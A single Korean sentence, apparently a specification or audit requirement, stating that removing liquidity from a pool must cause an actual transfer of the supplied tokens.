유동성을 제거하는 경우 유동성에 공급된 토큰의 실제 이동이 발생해야 한다.